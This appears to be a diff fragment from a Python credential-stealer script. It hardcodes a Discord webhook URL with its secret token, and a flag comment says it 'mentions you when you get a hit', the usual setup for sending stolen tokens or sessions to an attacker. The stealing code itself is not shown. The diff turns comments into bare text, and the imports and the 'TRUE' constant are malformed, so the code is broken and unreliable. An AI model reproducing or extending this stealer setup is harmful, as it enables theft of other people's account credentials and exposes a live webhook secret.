@@ -4,10 +4,10 @@ import json;
 import os;
 from urllib.request import Request urlopen
 
-# your webhook URL
+ your webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/804218581340258355/vFYX1xCUHXqU8j4axQ36uVjCssUJodMUYbsys6XdxOoGn2IXl7N-xmGxLXCWBvm3XmHf"
 
-# mentions you when you get a hit
+ mentions you when you get a hit
 PING_ME = TRUE
 
 def uuid_dashed(uuid):
